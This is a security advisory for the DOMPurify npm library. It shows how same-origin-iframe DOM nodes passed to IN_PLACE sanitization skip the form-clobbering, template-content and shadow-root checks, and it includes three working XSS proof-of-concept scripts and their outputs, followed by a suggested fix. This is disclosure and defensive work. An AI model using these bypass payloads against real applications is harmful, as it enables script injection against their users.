# [M] DOMPurify: Cross-realm IN_PLACE sanitization leaves executable markup intact via realm-bound `instanceof` checks

## Summary
Severity: Medium
Advisory: GHSA-hpcv-96wg-7vj8
CVE: CVE-2026-49458
CWE: CWE-501, CWE-693, CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-06-15
Source: https://github.com/advisories/GHSA-hpcv-96wg-7vj8
Type: github-advisory

## Affected
- npm: `dompurify` — affected >=0 <3.4.6

## Details
# Cross-realm IN_PLACE sanitization leaves executable markup intact via realm-bound `instanceof` checks

**CWE**: CWE-79 (XSS — Improper Neutralization of Input During Web Page Generation) via CWE-693 (Protection Mechanism Failure — realm-bound `instanceof` checks fail-open on foreign-realm DOM nodes) and CWE-501 (Trust Boundary Violation — foreign-realm nodes accepted for sanitization but later checks are bound to the parent realm)

## Summary

`DOMPurify.sanitize(node, { IN_PLACE: true })` accepts a DOM node from any same-origin realm (e.g. a node owned by an application-created iframe document), but several follow-on security checks compare the node against constructors from the parent realm. Because constructors are per-realm, `instanceof HTMLFormElement`, `instanceof NamedNodeMap`, `instanceof DocumentFragment`, and `instanceof Element` all return `false` for nodes belonging to the iframe's realm. The library therefore proceeds as if the foreign-realm form is not clobberable, the foreign-realm `<template>`'s `.content` is not a document fragment, and the foreign-realm attached shadow root is not a document fragment — silently skipping the clobber/template-content/shadow-DOM sanitization branches that those checks gate. Attacker-controlled markup survives in form attributes, template content, and attached shadow roots, and executes when the application later inserts or activates the sanitized node.

## Affected

- DOMPurify ≤ 3.4.5, including `main` at `89da34e03ec17868e561f87f3747a9371b61a9e7`
- Any caller that constructs or parses untrusted DOM in a same-origin iframe (or any other same-origin realm — popup window, opened tab, programmatically-created `<iframe srcdoc>`) and then calls `DOMPurify.sanitize(foreignNode, { IN_PLACE: true })` against a sanitizer instance bound to a different realm

Not affected:
- String-input `DOMPurify.sanitize(dirtyString)` — the library calls its own parser inside `_initDocument`, the resulting nodes belong to the sanitizer's own realm, and the `instanceof` checks resolve as expected
- IN_PLACE calls where the input node was created in the same realm as the DOMPurify instance

## Vulnerability details

The unifying defect is that `_isClobbered`, `_sanitizeShadowDOM`'s template-content recursion, and `_sanitizeAttachedShadowRoots` all use realm-bound `instanceof` checks against the parent-realm constructors. Each branch fails-open for foreign-realm objects.

### [A] — `_isClobbered` gates on `element instanceof HTMLFormElement`

`src/purify.ts:1120-1140`:

```ts
const _isClobbered = function (element: Element): boolean {
  return (
    element instanceof HTMLFormElement &&    // [A] realm-bound — false for any
                                              //     iframe-realm <form> element
    (typeof element.nodeName !== 'string' ||
      typeof element.textContent !== 'string' ||
      typeof element.removeChild !== 'function' ||
      !(element.attributes instanceof NamedNodeMap) ||   // [A'] also realm-bound
      typeof element.removeAttribute !== 'function' ||
      typeof element.setAttribute !== 'function' ||
      typeof element.namespaceURI !== 'string' ||
      typeof element.insertBefore !== 'function' ||
      typeof element.hasChildNodes !== 'function' ||
      !(element.childNodes && typeof element.childNodes.length === 'number'))
  );
};
```

A foreign-realm `<form>` is an instance of the foreign realm's `HTMLFormElement`, not the parent realm's. The leading `instanceof` short-circuits to `false`, so `_isClobbered` returns `false` regardless of the named-property clobbering present on the form. The follow-on `_sanitizeAttributes` then iterates `currentNode.attributes` — which itself can be a clobbered value (a foreign-realm `<input>` whose `name="attributes"` shadows the form's real `NamedNodeMap`). The attribute walk traverses the wrong collection and never reaches the actual `onmouseover` / `onclick` / `action=javascript:` attributes on the form root.

### [B] — `_sanitizeShadowDOM` gates template recursion on `content instanceof DocumentFragment`

`src/purify.ts:1660-1662`:

```ts
while ((shadowNode = shadowIterator.nextNode())) {
  ...
  _sanitizeElements(shadowNode);
  _sanitizeAttributes(shadowNode);
  /* Deep shadow DOM detected */
  if (shadowNode.content instanceof DocumentFragment) {   // [B] realm-bound
    _sanitizeShadowDOM(shadowNode.content);
  }
}
```

The same check exists in the main iterator at `:1861-1862`:

```ts
if (currentNode.content instanceof DocumentFragment) {     // [B'] realm-bound
  _sanitizeShadowDOM(currentNode.content);
}
```

For a `<template>` element constructed in a foreign realm, `template.content` is a `DocumentFragment` from that realm — not from the parent realm. Both checks miss it, and the template's contents (which carry attacker-controlled `<img src=x onerror=...>` etc.) are never walked. The sanitized output appears clean from the outside, but the moment a consumer does `node.cloneNode(true)` / `importNode(template.content, true)` / inserts it into the live DOM, the embedded handler fires.

### [C] — `_sanitizeAttachedShadowRoots` gates recursion on `sr instanceof DocumentFragment`

`src/purify.ts:1702-1712`:

```ts
if (nodeType === NODE_TYPE.element) {
  const sr = getShadowRoot
    ? getShadowRoot(root)
    : (root as Element).shadowRoot;
  if (sr instanceof DocumentFragment) {                    // [C] realm-bound
    _sanitizeAttachedShadowRoots(sr);
    _sanitizeShadowDOM(sr);
  }
}
```

For a host element constructed in a foreign realm with `host.attachShadow({mode:'open'})`, `host.shadowRoot` is a foreign-realm `ShadowRoot` (which extends the foreign realm's `DocumentFragment`). The `instanceof DocumentFragment` against the parent realm fails. The whole shadow subtree is skipped. When the host is later attached to the live document, the shadow DOM activates with attacker-controlled content.

### The mismatch

DOMPurify *accepts* foreign-realm nodes for sanitization (the entry-point's `_isNode(dirty)` at `:1750` is realm-agnostic — it checks shape, not constructor identity), so callers reasonably expect that the library's downstream defenses are equally realm-agnostic. They are not. `[A]` / `[B]` / `[C]` each fail-open for foreign-realm objects. A correct guard at each of those sites would use a realm-independent shape check (e.g., `nodeType === 11` for `DocumentFragment`, tag-name comparison for `HTMLFormElement` recognition).

## Proof of concept

Each PoC creates the attacker payload in a same-origin iframe, then calls the parent-realm `DOMPurify.sanitize(node, { IN_PLACE: true })` and verifies that handler execution succeeds on subsequent activation.

### PoC 1 — cross-realm form clobbering survives

```js
const iframe = document.createElement('iframe');
iframe.srcdoc = '<!doctype html><html><body></body></html>';
iframe.onload = () => {
  const idoc = iframe.contentDocument;
  const div = idoc.createElement('div'); div.id = 'dirty';
  const form = idoc.createElement('form');
  form.setAttribute('onmouseover',
    'window.parent.__dompurify_xss=(window.parent.__dompurify_xss||0)+1');
  const inp = idoc.createElement('input');
  inp.setAttribute('name', 'attributes');                  // clobbers form.attributes
  form.appendChild(inp);
  div.appendChild(form);

  DOMPurify.sanitize(div, { IN_PLACE: true });

  window.__dompurify_xss = 0;
  document.body.appendChild(div);
  form.dispatchEvent(new MouseEvent('mouseover', { bubbles: true }));
  // window.__dompurify_xss === 1
};
document.body.appendChild(iframe);
```

Observed (Chromium 148, DOMPurify 3.4.5, HEAD `89da34e`):

```json
{
  "sanitizeError": null,
  "before": {
    "formIsMainRealmHTMLFormElement": false,
    "formIsForeignRealmHTMLFormElement": true,
    "formAttributesType": "[object HTMLInputElement]",
    "formAttributesEqualsInput": true
  },
  "after": {
    "html": "<div id=\"dirty\"><form onmouseover=\"window.parent.__dompurify_xss=(window.parent.__dompurify_xss||0)+1\"><input></form></div>",
    "formOnmouseover": "window.parent.__dompurify_xss=(window.parent.__dompurify_xss||0)+1",
    "xssExecuted": 1
  }
}
```

### PoC 2 — cross-realm `<template>` content is never walked

```js
const iframe = document.createElement('iframe');
iframe.srcdoc = '<!doctype html><html><body></body></html>';
iframe.onload = () => {
  const idoc = iframe.contentDocument;
  const div = idoc.createElement('div');
  const tpl = idoc.createElement('template');
  tpl.innerHTML = '<img src="x" onerror=' +
    '"window.parent.__dompurify_template_xss=(window.parent.__dompurify_template_xss||0)+1">';
  div.appendChild(tpl);

  DOMPurify.sanitize(div, { IN_PLACE: true });

  window.__dompurify_template_xss = 0;
  const clone = idoc.importNode(tpl.content, true);
  document.body.appendChild(clone);                        // fires onerror
};
document.body.appendChild(iframe);
```

Observed:

```json
{
  "before": {
    "templateIsMainRealmHTMLTemplateElement": false,
    "contentIsMainRealmDocumentFragment": false,
    "contentIsForeignRealmDocumentFragment": true
  },
  "after": {
    "templateInnerHTMLAfter": "<img src=\"x\" onerror=\"window.parent.__dompurify_template_xss=(window.parent.__dompurify_template_xss||0)+1\">",
    "xssExecuted": 1
  }
}
```

### PoC 3 — cross-realm attached shadow root is never walked

```js
const iframe = document.createElement('iframe');
iframe.srcdoc = '<!doctype html><html><body></body></html>';
iframe.onload = () => {
  const idoc = iframe.contentDocument;
  const host = idoc.createElement('div');
  host.attachShadow({ mode: 'open' }).innerHTML =
    '<img src=x onerror="window.parent.__dompurify_shadow_xss=(window.parent.__dompurify_shadow_xss||0)+1"><b>safe text</b>';

  DOMPurify.sanitize(host, { IN_PLACE: true });

  window.__dompurify_shadow_xss = 0;
  document.body.appendChild(host);                          // shadow activates, onerror fires
};
document.body.appendChild(iframe);
```

Observed:

```json
{
  "before": {
    "hostIsMainRealmElement": false,
    "shadowRootIsMainRealmDocumentFragment": false,
    "shadowRootIsForeignRealmDocumentFragment": true
  },
  "after": {
    "shadowRootInnerHTMLAfter": "<img src=\"x\" onerror=\"window.parent.__dompurify_shadow_xss=(window.parent.__dompurify_shadow_xss||0)+1\"><b>safe text</b>",
    "xssExecuted": 1
  }
}
```

All three PoCs run cleanly against `dist/purify.js` built from current `main` HEAD `89da34e`.

## Impact

### Direct

Any application that parses, isolates, or constructs untrusted DOM inside a same-origin iframe (a common technique for `<base href>` isolation, `document.write` sandboxing, layout pre-measurement, declarative-shadow-root attachment, etc.) and then hands the resulting node to a parent-realm DOMPurify instance with `IN_PLACE: true` is vulnerable. The library returns a node whose top-level shape looks sanitized, but executable attacker markup remains in:

- **Form root attributes** — `onmouseover`, `onfocus`, `onclick`, `action="javascript:..."`, `formaction=`, `target=`, `id=` (DOM-clobbering target), and the full attribute-allowlist set, because `_sanitizeAttributes` walks a clobbered `.attributes` instead of the real `NamedNodeMap`.
- **`<template>` content** — `<img onerror>`, `<svg><script>`, `<iframe srcdoc>`, etc., because the inert template tree is never recursed into.
- **Attached shadow roots** — any markup inside the shadow root, because the shadow walk is skipped entirely.

XSS triggers when the consuming code:
- Inserts the form into the live DOM and the user interacts with it (mouseover, click, focus).
- Clones template content with `importNode` / `cloneNode(true)` / `node.appendChild(template.content)` into the live DOM.
- Appends the shadow host to the live document (the shadow root becomes active and `<img onerror>` fires synchronously during the insertion microtask).

### Indirect / second-order

- **DOM-based template engines** (Lit, Polymer, Vue, FAST) that often use foreign-realm `<template>` parsing for performance reasons. If they pipe attacker-influenced content through such a template and then run DOMPurify on the parent-realm host, the template body is sanitization-skipped.
- **Editor / WYSIWYG frameworks** that render preview content inside a same-origin iframe and then move it into the main document after sanitization.
- **Email/HTML preview libraries** that parse received HTML in an isolated iframe to neutralize CSS / `<base>` / form submission, then sanitize via the main page's DOMPurify.
- **Declarative shadow DOM consumers** that adopt a host from one realm into another — the shadow subtree carries the bypass.

The known prior IN_PLACE-cross-window fix (which closed an earlier cross-window primitive) does not cover the realm-bound `instanceof` checks at `[A]`, `[B]`, `[C]`; current `main` HEAD is still affected.

## Root cause

Per-realm constructors. `instanceof X` checks the prototype chain against the parent realm's `X.prototype`. Foreign-realm objects have a different `X.prototype` and so fail every such check. The sanitizer accepts foreign-realm DOM nodes for `IN_PLACE` sanitization (the entry-point only checks node shape), but several internal security decisions are still bound to the parent realm. This produces an inconsistency: *"we accept your node, but we silently behave as if it is not a form, not a template, not a shadow root."*

Other realm-bound `instanceof` sites in the same file that should likely be audited as part of the same fix sweep:

```ts
element instanceof HTMLFormElement     // src/purify.ts:1122
element.attributes instanceof NamedNodeMap  // src/purify.ts:1126
sr instanceof DocumentFragment         // src/purify.ts:1706
currentNode.content instanceof DocumentFragment  // src/purify.ts:1861
shadowNode.content instanceof DocumentFragment   // src/purify.ts:1660 (approx)
currentNode instanceof Element         // src/purify.ts:1296 (callsite of _checkValidNamespace)
```

## Suggested fix

Use realm-independent shape checks consistently for any decision made on a node accepted from `IN_PLACE`:

1. **`HTMLFormElement` detection** — compare via the realm-independent `getNodeName` cached prototype getter introduced for the recent shadow-root traversal hardening:

   ```ts
   const _isClobbered = function (element: Element): boolean {
     const nn = getNodeName ? getNodeName(element) : element.nodeName;
     if (typeof nn !== 'string' || transformCaseFunc(nn) !== 'form') return false;
     // ... rest of the typeof / cached-getter shape checks ...
   };
   ```

2. **`DocumentFragment` detection** — `nodeType === NODE_TYPE.documentFragment` (i.e., `11`), not `instanceof DocumentFragment`. The check is already realm-independent because `Node.nodeType` is a numeric constant. Same change for the `<template>`-content and attached-shadow-root recursion sites.

3. **`NamedNodeMap` detection** — read `element.attributes` via the cached `Element.prototype.attributes` getter (introduce `getAttributes = lookupGetter(ElementPrototype, 'attributes')`) and verify `nodeType === 11`-style shape (length is a number, indexed `[i]` returns objects with `.name`/`.value` strings). Do not rely on `instanceof NamedNodeMap`.

4. **`Element` detection** at `:1296` — replace `currentNode instanceof Element` with a shape check (`getNodeType(currentNode) === NODE_TYPE.element`).

The invariant the fix should encode: *once `IN_PLACE` accepts a foreign-realm node for sanitization, every downstream security decision on that node must be foreign-realm-safe.* The cached prototype getters introduced for the shadow-root hardening already point at the right pattern; the fix is to extend that pattern to every realm-bound check in the sanitization path.

## References
- https://github.com/cure53/DOMPurify/security/advisories/GHSA-hpcv-96wg-7vj8
- https://github.com/cure53/DOMPurify
